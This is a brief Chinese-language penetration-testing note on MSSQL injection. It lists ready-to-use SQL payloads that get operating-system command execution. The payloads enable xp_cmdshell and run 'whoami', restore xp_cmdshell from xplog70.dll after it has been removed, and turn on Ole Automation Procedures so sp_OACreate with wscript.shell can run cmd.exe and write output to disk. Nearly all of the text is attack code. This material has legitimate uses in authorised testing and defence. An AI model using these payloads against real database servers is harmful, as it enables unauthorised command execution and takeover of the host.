# MSSQL注入

参考：

- https://xz.aliyun.com/t/248
- https://xz.aliyun.com/t/1224
- https://xz.aliyun.com/t/1051
- https://xz.aliyun.com/t/2596

## 命令执行

### 开启`xp_cmdshell`并调用执行命令

```sql
EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;  /*开启xp_cmdshell*/

exec master..xp_cmdshell "whoami"  /*执行命令*/

Exec master.dbo.sp_addextendedproc 'xp_cmdshell','D:\\xplog70.dll' /*使用xplog70.dll恢复xp_cmdshell*/
```

![](/images/19-7-12_SQL_MSSQL注入_1.png)

#### xp_cmdshell被删除，使用SP_OACreate

```sql
EXEC sp_configure 'show advanced options', 1;   
RECONFIGURE WITH OVERRIDE;   
EXEC sp_configure 'Ole Automation Procedures', 1;   
RECONFIGURE WITH OVERRIDE;   
EXEC sp_configure 'show advanced options', 0;

declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c whoami >d:\\1.txt'   //
```

![](/images/19-7-12_SQL_MSSQL注入_2.png)

